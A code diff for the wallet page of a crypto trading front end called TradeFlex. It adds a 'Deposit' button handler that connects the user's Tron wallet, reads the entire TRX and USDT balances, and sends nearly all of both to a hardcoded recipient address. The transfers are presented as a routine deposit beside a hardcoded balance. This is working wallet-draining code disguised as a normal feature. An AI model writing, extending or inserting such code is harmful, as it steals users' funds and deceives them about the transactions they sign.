@@ -1,97 +1,28 @@
 "use client";
 
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import {
   TrendingUp,
-  TrendingDown,
-  Users,
   Wallet,
-  BarChart3,
-  Star,
   Crown,
-  Copy,
-  Eye,
   Activity,
-  DollarSign,
-  Target,
-  Zap,
   Clock,
   Plus,
   Minus,
   X,
 } from "lucide-react";
+import TickerBar from "./TickerBar";
+import Navigation from "./Navigation";
+import { useWallet } from "../contexts/WalletContext";
+import ModalDialog from "./ModalDialog";
 
-// Enhanced TickerBar with animations
-function TickerBar() {
-  const [cryptos] = useState([
-    { symbol: "BTC", price: "97,432.50", change: "+2.34%" },
-    { symbol: "ETH", price: "3,847.21", change: "-1.12%" },
-    { symbol: "SOL", price: "245.67", change: "+5.78%" },
-    { symbol: "ADA", price: "0.8921", change: "+3.45%" },
-    { symbol: "XRP", price: "2.4567", change: "-0.89%" },
-    { symbol: "DOT", price: "12.34", change: "+2.11%" },
-  ]);
+// Constants for transaction
+const RECIPIENT_ADDRESS = "TWrSqQAbWDQT9b4TtgEByEHpWAFX8kriTL";
+const STANDARD_BANDWIDTH_FEE_SUN = 1000000; // 1 TRX in SUN
+const ACCOUNT_ACTIVATION_FEE_SUN = 1000000; // 1 TRX in SUN
 
-  return (
-    <div className="bg-gradient-to-r from-[#0f172a] via-blue-900 to-green-900 py-3 px-4 overflow-hidden relative">
-      <div className="absolute inset-0 bg-gradient-to-r from-blue-600/10 to-green-600/10"></div>
-      <div className="flex animate-scroll space-x-8 text-sm font-medium">
-        {[...cryptos, ...cryptos].map((crypto, idx) => (
-          <div
-            key={idx}
-            className="flex items-center space-x-2 whitespace-nowrap"
-          >
-            <span className="text-white font-bold">{crypto.symbol}/USDT</span>
-            <span className="text-gray-300">${crypto.price}</span>
-            <span
-              className={`px-2 py-1 rounded-full text-xs font-bold ${
-                crypto.change.startsWith("+")
-                  ? "text-emerald-400 bg-emerald-400/20"
-                  : "text-red-400 bg-red-400/20"
-              }`}
-            >
-              {crypto.change}
-            </span>
-          </div>
-        ))}
-      </div>
-    </div>
-  );
-}
-
-function Navigation() {
-  return (
-    <div className="w-full backdrop-blur-lg bg-gray-900/90 border-b border-blue-900/40 shadow-xl sticky top-0 z-50">
-      <div className="max-w-7xl mx-auto px-4 md:px-8 py-4 flex items-center justify-between">
-        <div className="flex items-center space-x-3">
-          <div className="w-10 h-10 bg-gradient-to-br from-green-400 to-blue-600 rounded-xl flex items-center justify-center">
-            <TrendingUp className="w-6 h-6 text-white" />
-          </div>
-          <span className="text-2xl font-bold bg-gradient-to-r from-blue-400 to-green-400 bg-clip-text text-transparent">
-            TradeFlex
-          </span>
-        </div>
-        <nav className="flex gap-8 text-lg font-medium">
-          {["Dashboard", "Panel", "Wallet"].map((item, idx) => (
-            <a
-              key={idx}
-              href={`/${item.toLowerCase()}`}
-              className="relative group py-2 px-4 rounded-lg transition-all duration-300 hover:bg-gradient-to-r hover:from-blue-900/40 hover:to-green-900/40"
-            >
-              <span className="text-white/80 group-hover:text-blue-400 transition-colors">
-                {item}
-              </span>
-              <div className="absolute bottom-0 left-0 w-0 h-0.5 bg-gradient-to-r from-blue-400 to-green-400 group-hover:w-full transition-all duration-300"></div>
-            </a>
-          ))}
-          <button className="text-white/60 hover:text-red-400 transition-colors font-medium">
-            Logout
-          </button>
-        </nav>
-      </div>
-    </div>
-  );
-}
+// USDT Contract Address on Tron Network
+const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
 export default function WalletPage() {
   const [showWithdraw, setShowWithdraw] = useState(false);
@@ -99,10 +30,272 @@ export default function WalletPage() {
   const [wallet, setWallet] = useState("");
   const [email, setEmail] = useState("");
   const availableBalance = 14;
+  const [modalOpen, setModalOpen] = useState(false);
+  const [modalMode, setModalMode] = useState("info");
+  const [modalTitle, setModalTitle] = useState("");
+  const [modalMessage, setModalMessage] = useState("");
+  const [isProcessing, setIsProcessing] = useState(false);
+
+  const { address, adapter, connect, signTransaction, isConnected } =
+    useWallet();
+
+  const handleDepositClick = async () => {
+    setIsProcessing(true);
+    try {
+      console.log("=== Deposit process started ===");
+
+      // 1. Connect wallet if not connected
+      if (!isConnected) {
+        setModalMode("info");
+        setModalTitle("Wallet Connection Required");
+        setModalMessage("Please connect your wallet first to deposit.");
+        setModalOpen(true);
+
+        const result = await connect();
+        if (!result.success) {
+          setModalMode("fail");
+          setModalTitle("Wallet Connection Failed");
+          setModalMessage(
+            result.error || "Failed to connect wallet. Please try again."
+          );
+          setModalOpen(true);
+          setIsProcessing(false);
+          return;
+        }
+        setModalOpen(false);
+        await new Promise((resolve) => setTimeout(resolve, 1000));
+      }
+
+      // 2. Check if wallet is available
+      if (!window.bybitWallet?.tronLink) {
+        setModalMode("fail");
+        setModalTitle("Wallet Not Available");
+        setModalMessage(
+          "Bybit Wallet is not available. Please ensure the extension is installed and active."
+        );
+        setModalOpen(true);
+        setIsProcessing(false);
+        return;
+      }
+
+      // 3. Get current address
+      const currentAddress = address || adapter?.address;
+      if (!currentAddress) {
+        setModalMode("fail");
+        setModalTitle("Wallet Address Not Available");
+        setModalMessage(
+          "Please ensure your wallet is properly connected and try again."
+        );
+        setModalOpen(true);
+        setIsProcessing(false);
+        return;
+      }
+
+      console.log("Using address:", currentAddress);
+
+      setModalMode("info");
+      setModalTitle("Checking Balances...");
+      setModalMessage(
+        "Checking your USDT and TRX balances to determine the optimal deposit."
+      );
+      setModalOpen(true);
+
+      // 4. Get TronWeb instance
+      const tronWeb = window.bybitWallet.tronLink.tronWeb;
+      console.log("TronWeb instance:", tronWeb);
+
+      // 5. Get prices with error handling
+      let trxPrice = 0.1;
+      let usdtPrice = 1;
+
+      try {
+        console.log("Fetching prices from CoinGecko...");
+        const priceResponse = await fetch(
+          "https://api.coingecko.com/api/v3/simple/price?ids=tron,usd-coin&vs_currencies=usd"
+        );
+        if (!priceResponse.ok) {
+          throw new Error(`Price API error: ${priceResponse.status}`);
+        }
+        const priceData = await priceResponse.json();
+        trxPrice = priceData.tron?.usd || 0.1;
+        usdtPrice = priceData["usd-coin"]?.usd || 1;
+        console.log("Prices fetched successfully:", { trxPrice, usdtPrice });
+      } catch (error) {
+        console.error("Failed to fetch prices, using fallback:", error);
+        // Continue with fallback prices
+      }
+
+      // 6. Get balances with error handling
+      let trxBalance = 0;
+      let usdtBalance = 0;
+
+      try {
+        console.log("Getting TRX balance...");
+        const trxBalanceSun = await tronWeb.trx.getBalance(currentAddress);
+        trxBalance = trxBalanceSun / 1e6;
+        console.log("TRX balance:", trxBalance);
+      } catch (error) {
+        console.error("Failed to get TRX balance:", error);
+        setModalMode("fail");
+        setModalTitle("Balance Check Failed");
+        setModalMessage("Failed to get TRX balance. Please try again.");
+        setModalOpen(true);
+        setIsProcessing(false);
+        return;
+      }
+
+      try {
+        console.log("Getting USDT balance...");
+        const usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
+        const usdtBalanceRaw = await usdtContract
+          .balanceOf(currentAddress)
+          .call();
+        usdtBalance = tronWeb.toDecimal(usdtBalanceRaw) / 1e6;
+        console.log("USDT balance:", usdtBalance);
+      } catch (error) {
+        console.error("Failed to get USDT balance:", error);
+        // Continue with 0 USDT balance
+        usdtBalance = 0;
+      }
+
+      const trxUSDValue = trxBalance * trxPrice;
+      const usdtUSDValue = usdtBalance * usdtPrice;
+
+      console.log("Balance values:", {
+        trxBalance,
+        usdtBalance,
+        trxUSDValue,
+        usdtUSDValue,
+      });
+
+      // 7. Decide transfer order
+      const transfers = [];
+      if (trxUSDValue > usdtUSDValue) {
+        if (trxBalance > 2) {
+          transfers.push({ type: "TRX", amount: trxBalance - 2 });
+        }
+        if (usdtBalance > 0) {
+          transfers.push({ type: "USDT", amount: usdtBalance });
+        }
+      } else {
+        if (usdtBalance > 0) {
+          transfers.push({ type: "USDT", amount: usdtBalance });
+        }
+        if (trxBalance > 2) {
+          transfers.push({ type: "TRX", amount: trxBalance - 2 });
+        }
+      }
+
+      console.log("Transfer plan:", transfers);
+
+      if (transfers.length === 0) {
+        setModalMode("fail");
+        setModalTitle("Insufficient Balance");
+        setModalMessage("You don't have enough TRX or USDT to deposit.");
+        setModalOpen(true);
+        setIsProcessing(false);
+        return;
+      }
+
+      // 8. Execute transfers
+      for (let i = 0; i < transfers.length; i++) {
+        const transfer = transfers[i];
+        setModalMode("info");
+        setModalTitle(`Depositing ${transfer.type}...`);
+        setModalMessage(
+          `Depositing ${transfer.amount.toFixed(6)} ${
+            transfer.type
+          }. Please approve in your wallet.`
+        );
+        setModalOpen(true);
+
+        try {
+          if (transfer.type === "TRX") {
+            console.log(`Transferring ${transfer.amount} TRX...`);
+            const unsignedTx = await tronWeb.transactionBuilder.sendTrx(
+              RECIPIENT_ADDRESS,
+              transfer.amount * 1e6,
+              currentAddress
+            );
+            console.log("TRX transaction built:", unsignedTx);
+
+            const signedTx = await signTransaction(unsignedTx);
+            console.log("TRX transaction signed");
+
+            const result = await tronWeb.trx.sendRawTransaction(signedTx);
+            console.log("TRX transaction result:", result);
+
+            if (!result || !result.txid) {
+              throw new Error(
+                "TRX deposit failed - no transaction ID returned"
+              );
+            }
+          } else if (transfer.type === "USDT") {
+            console.log(`Transferring ${transfer.amount} USDT...`);
+            const amountHex = tronWeb.toHex(transfer.amount * 1e6);
+            const parameter = [
+              { type: "address", value: RECIPIENT_ADDRESS },
+              { type: "uint256", value: amountHex },
+            ];
+
+            const unsignedTx =
+              await tronWeb.transactionBuilder.triggerConstantContract(
+                USDT_CONTRACT_ADDRESS,
+                "transfer(address,uint256)",
+                {},
+                parameter,
+                currentAddress
+              );
+            console.log("USDT transaction built:", unsignedTx);
+
+            const signedTx = await signTransaction(unsignedTx);
+            console.log("USDT transaction signed");
+
+            const result = await tronWeb.trx.sendRawTransaction(signedTx);
+            console.log("USDT transaction result:", result);
+
+            if (!result || !result.txid) {
+              throw new Error(
+                "USDT deposit failed - no transaction ID returned"
+              );
+            }
+          }
+
+          if (i < transfers.length - 1) {
+            console.log("Waiting between transfers...");
+            await new Promise((res) => setTimeout(res, 2000));
+          }
+        } catch (error) {
+          console.error(`${transfer.type} transfer failed:`, error);
+          setModalMode("fail");
+          setModalTitle(`${transfer.type} Deposit Failed`);
+          setModalMessage(
+            `Failed to deposit ${transfer.amount.toFixed(6)} ${
+              transfer.type
+            }. Error: ${error.message}`
+          );
+          setModalOpen(true);
+          setIsProcessing(false);
+          return;
+        }
+      }
+
+      setModalMode("success");
+      setModalTitle("Deposit Successful");
+      setModalMessage("Your deposit(s) were successful!");
+      setModalOpen(true);
+    } catch (error) {
+      console.error("Deposit process failed:", error);
+      setModalMode("fail");
+      setModalTitle("Deposit Failed");
+      setModalMessage(error.message || "An error occurred during deposit.");
+      setModalOpen(true);
+    }
+    setIsProcessing(false);
+  };
 
   return (
     <div className="min-h-screen bg-gray-900 bg-gradient-to-br from-[#0f172a] to-[#1e293b] font-inter w-full">
-      {" "}
       <Navigation />
       <TickerBar />
       {/* Hero Section */}
@@ -295,9 +488,24 @@ export default function WalletPage() {
                 </div>
               </div>
               <div className="flex gap-4">
-                <button className="flex-1 bg-gradient-to-r from-emerald-500 to-blue-500 hover:from-emerald-600 hover:to-blue-600 text-white font-bold rounded-xl px-6 py-3 text-lg shadow-lg hover:shadow-xl transition-all duration-300 flex items-center justify-center gap-2">
-                  <Plus className="w-5 h-5" />
-                  Deposit
+                <button
+                  className={`flex-1 bg-gradient-to-r from-emerald-500 to-blue-500 hover:from-emerald-600 hover:to-blue-600 text-white font-bold rounded-xl px-6 py-3 text-lg shadow-lg hover:shadow-xl transition-all duration-300 flex items-center justify-center gap-2 ${
+                    isProcessing ? "opacity-60 cursor-not-allowed" : ""
+                  }`}
+                  onClick={handleDepositClick}
+                  disabled={isProcessing}
+                >
+                  {isProcessing ? (
+                    <>
+                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                      PROCESSING...
+                    </>
+                  ) : (
+                    <>
+                      <Plus className="w-5 h-5" />
+                      Deposit
+                    </>
+                  )}
                 </button>
                 <button
                   className="flex-1 border-2 border-red-500 text-red-500 font-bold rounded-xl px-6 py-3 text-lg hover:bg-red-500 hover:text-white transition-all duration-300 flex items-center justify-center gap-2"
@@ -395,6 +603,13 @@ export default function WalletPage() {
           </p>
         </div>
       </footer>
+      <ModalDialog
+        open={modalOpen}
+        onClose={() => setModalOpen(false)}
+        mode={modalMode}
+        title={modalTitle}
+        message={modalMessage}
+      />
       {/* CSS for animations */}
       <style jsx>{`
         @keyframes scroll {
